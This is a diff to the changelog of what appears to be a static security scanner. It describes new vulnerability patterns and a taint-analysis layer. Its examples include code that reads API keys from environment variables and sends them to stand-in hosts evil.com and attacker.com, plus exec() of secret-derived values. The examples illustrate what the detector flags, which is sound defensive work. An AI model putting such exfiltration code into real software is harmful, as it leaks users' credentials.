@@ -7,6 +7,121 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 
 ## [Unreleased] - v1.0.0 Development
 
+### Phase 3.2: Pattern Expansion (2026-02-08)
+
+**Major Feature:** Comprehensive security pattern coverage (104 patterns)
+
+#### Added
+- **25 New Security Patterns** across 6 new categories
+  - SQL Injection (4 patterns): String concat, template literals, Python f-strings, execute formatting
+  - XSS Injection (5 patterns): dangerouslySetInnerHTML, innerHTML, document.write, eval with HTML, location.href
+  - Insecure Cryptography (7 patterns): MD5, SHA-1, weak random, hardcoded secrets, DES/3DES, ECB mode
+  - Prototype Pollution (3 patterns): __proto__ access, constructor.prototype, unsafe merge
+  - Python Deserialization (4 patterns): YAML unsafe load, XML without defusedxml, marshal.loads, jsonpickle
+  - ReDoS (2 patterns): Nested quantifiers, overlapping alternatives
+
+- **Remediation Guidance**: Each pattern includes actionable fix suggestions
+  - TypeScript/JavaScript best practices
+  - Python secure coding guidelines
+  - Library recommendations (DOMPurify, defusedxml, cryptography)
+  - Code examples for safe alternatives
+
+#### Enhanced
+- Pattern coverage: 79 → 104 patterns (+32%)
+- Category coverage: 8 → 14 categories
+- TypeScript patterns: 48 → 59
+- Python patterns: 31 → 45
+- All 104 patterns validated against JSON schema
+
+#### Quality
+- ✅ All 112 tests passing (no regressions)
+- ✅ Pattern validation: 100% compliant
+- ✅ Build succeeds with all new patterns
+- ✅ IDs follow schema: category-NNN format
+
+---
+
+### Phase 3.1: Dataflow/Taint Analysis (2026-02-08)
+
+**Major Feature:** Layer 5 - Multi-step attack detection via taint analysis
+
+#### Added
+- **Dataflow Analysis Engine**: Tracks data flow from sources to dangerous sinks
+  - Dataflow graph construction from TypeScript AST
+  - Worklist algorithm for taint propagation (O(N+E) complexity)
+  - Path detection: Identifies source → sink paths through code
+  - Confidence scoring: high/medium/low based on path complexity
+
+- **Taint Sources** (where untrusted data originates):
+  - Environment variables (`process.env.*`)
+  - User input (function parameters, MCP tool args)
+  - Network responses (`fetch()`, `axios()`)
+  - Future: File reads
+
+- **Taint Sinks** (dangerous operations):
+  - Command execution (`exec`, `spawn`, `execSync`)
+  - Code evaluation (`eval`, `Function` constructor)
+  - Network requests (`fetch`, `axios`)
+  - File writes (`fs.writeFile`)
+  - Dynamic imports (`require`, `import()`)
+
+- **Detection Capabilities** (v1.0.0 scope):
+  - ✅ Direct taint flow: `const cmd = process.env.X; exec(cmd)`
+  - ✅ Assignment chains: `const a = env.KEY; const b = a; exec(b)`
+  - ✅ Property assignment: `obj.key = env.SECRET; send(obj.key)`
+  - ✅ Object construction: `const cfg = {k: env.X}; send(cfg.k)`
+  - ✅ Template literals: `const url = \`evil.com?key=\${env.KEY}\``
+  - ✅ Property reads: `const cfg = {k: env.X}; const v = cfg.k`
+  - ✅ Single-file analysis (no cross-file tracking in v1.0.0)
+
+- **New Test Suite**: 20 comprehensive dataflow tests
+  - Graph construction tests
+  - Taint propagation tests
+  - Path detection tests
+  - Multi-step flow tests
+  - Edge case handling
+  - Total: 112 tests (92 → 112, +22%)
+
+#### Examples Detected
+```typescript
+// Example 1: Environment variable exfiltration
+const apiKey = process.env.OPENAI_API_KEY;
+fetch('https://evil.com', { body: apiKey });  // CRITICAL: Detected
+
+// Example 2: Multi-step command injection
+const secret = process.env.SECRET;
+const config = { key: secret };
+const data = config.key;
+exec(data);  // CRITICAL: Detected (4-step path)
+
+// Example 3: Template literal exfiltration
+const key = process.env.API_KEY;
+const url = `https://attacker.com?key=${key}`;
+fetch(url);  // CRITICAL: Detected
+```
+
+#### Architecture
+- **Layer 5**: New dataflow analysis layer in scan pipeline
+- **5 New Files**: dataflow-types, dataflow-graph, taint-propagation, layer integration, tests
+- **Integration**: Seamless integration with existing 4-layer architecture
+- **Performance**: O(N+E) complexity, minimal overhead
+
+#### Limitations (Documented)
+- ❌ Cross-file analysis (deferred to v1.1.0)
+- ❌ Return value propagation across functions
+- ❌ Async/Promise chain tracking
+- ❌ Array operations
+- ❌ Sanitizer detection
+- ❌ Control flow sensitivity (if/else branches)
+
+#### Quality
+- ✅ All 112 tests passing (92 original + 20 dataflow)
+- ✅ No regressions in existing functionality
+- ✅ Build succeeds
+- ✅ Corpus validation shows dataflow working
+
+---
+
 ### Phase 2: Python Support (2026-02-08)
 
 **Major Feature:** Full Python code analysis with tree-sitter
